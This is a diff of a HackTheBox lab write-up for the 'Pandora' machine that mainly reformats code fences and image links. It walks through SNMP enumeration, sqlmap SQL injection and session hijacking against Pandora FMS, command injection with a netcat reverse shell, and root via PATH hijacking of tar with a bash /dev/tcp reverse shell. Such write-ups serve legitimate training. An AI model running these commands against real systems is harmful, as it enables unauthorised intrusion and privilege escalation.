@@ -1,11 +1,12 @@
 ---
 title: Pandora - Exposed creds to SQLI to RCE
 date: 2025-12-16 00:00:00 +0000
-categories: [HackTheBox Writeups]
+categories: [HackTheBox Writeups, Linux]
 tags: [hackthebox, linux]
 ---
 
-```bash
+
+```
 ares@legion:~/HackTheBox$ sudo nmap -sVC -sU -A -T4 $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 12:17 EET
 Nmap scan report for 10.129.58.133 (10.129.58.133)
@@ -87,67 +88,70 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
 ```
 
+
 ```
 snmpwalk -v 1 -c public $target
-```bash
-![20251113124057.png](/assets/img/htb-writeups/Pasted image 20251113124057.png)
+```
+![[Pasted image 20251113124057.png]]
 
 After a few minutes we get:
-![20251113124750.png](/assets/img/htb-writeups/Pasted image 20251113124750.png)
+![[Pasted image 20251113124750.png]]
 
 ```
 cat /etc/apache2/sites-enabled/pandora.conf
-```bash
-![20251113131219.png](/assets/img/htb-writeups/Pasted image 20251113131219.png)
+```
+![[Pasted image 20251113131219.png]]
 
 Tunneling Web to our localhost: 
 ```
 ssh daniel@10.129.58.133 -L 80:127.0.0.1:80
-```bash
+```
+
 Version at the bottom:
-![20251113132929.png](/assets/img/htb-writeups/Pasted image 20251113132929.png)
+![[Pasted image 20251113132929.png]]
 
 Top Results for version:
 https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/
 https://github.com/UNICORDev/exploit-CVE-2020-5844.git
 
 sqlmap against the SQLi vulnerable endpoint /include/chart_gernerator.php .
-```bash
+```
 sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" --current-db
 ```
-```sql
+
 Obtaining the list of tables in the database
 ```
 sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
 ```
-```sql
+
 Dumping the tsessions_php table in order to obtain a usable session_id value in order to login into the Pandora FMS by impersonating an elevated user, i.e. matt .
-```bash
+```
 sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -Ttsessions_php --dump
 ```
-![20251113134631.png](/assets/img/htb-writeups/Pasted image 20251113134631.png)
+![[Pasted image 20251113134631.png]]
 
 URL in browser: 
-```bash
+```
 http://localhost/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
-```bash
+```
+
 Forward from burp: 
-![20251113135342.png](/assets/img/htb-writeups/Pasted image 20251113135342.png)
+![[Pasted image 20251113135342.png]]
 
 Vulnerable to:
 https://github.com/hadrian3689/pandorafms_7.44
 
 ```
-curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "http://localhost/pandora_console/ajax.php?page=include/ajax/events&perform_event_response=10000000&target=mkfifo /tmp/f%3B nc 10.10.14.53 4444 0%3C/tmp/f%7C/bin/sh - 2%3E%261%7Ctee /tmp/f&response_id=1"
-```bash
+curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "http://localhost/pandora_console/ajax.php?page=include/ajax/events&perform_event_response=10000000&target=mkfifo%20/tmp/f%3B%20nc%2010.10.14.53%204444%200%3C/tmp/f%7C/bin/sh%20-%202%3E%261%7Ctee%20/tmp/f&response_id=1"
+```
 or
 ```
 URL="http://localhost/pandora_console/ajax.php"
-PARAMS="page=include/ajax/events&perform_event_response=10000000&target=mkfifo /tmp/f%3B nc 10.10.14.53 4444 0%3C/tmp/f%7C/bin/sh - 2%3E%261%7Ctee /tmp/f&response_id=1"
+PARAMS="page=include/ajax/events&perform_event_response=10000000&target=mkfifo%20/tmp/f%3B%20nc%2010.10.14.53%204444%200%3C/tmp/f%7C/bin/sh%20-%202%3E%261%7Ctee%20/tmp/f&response_id=1"
 
 curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "${URL}?${PARAMS}"
-```bash
-![20251113141029.png](/assets/img/htb-writeups/Pasted image 20251113141029.png)
+```
+![[Pasted image 20251113141029.png]]
 
 Privesc:
 ```
@@ -155,25 +159,25 @@ find / -type f -perm -04000 -ls 2>/dev/null
 file /usr/bin/pandora_backup
 /usr/bin/pandora_backup --help
 ltrace /usr/bin/pandora_backup 2>&1
-```bash
-![20251113143249.png](/assets/img/htb-writeups/Pasted image 20251113143249.png)
+```
+![[Pasted image 20251113143249.png]]
 
 Breaking out from the restricted shell environment
 https://gtfobins.github.io/gtfobins/at/#shell
 ```
 echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
 ```
-```python
-```bash
+
+```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 # Execute again: 
 /usr/bin/pandora_backup
 ```
-![20251113144057.png](/assets/img/htb-writeups/Pasted image 20251113144057.png)
+![[Pasted image 20251113144057.png]]
 
 PATH variable hijacking tar:
-```bash
+```
 echo '#!/bin/bash' > /tmp/tar
 echo 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1' >> /tmp/tar
 chmod +x /tmp/tar
@@ -185,5 +189,5 @@ nc -nvlp 4444
 # Remote 
 /usr/bin/pandora_backup
 ```
-![20251113154458.png](/assets/img/htb-writeups/Pasted image 20251113154458.png)
+![[Pasted image 20251113154458.png]]
 
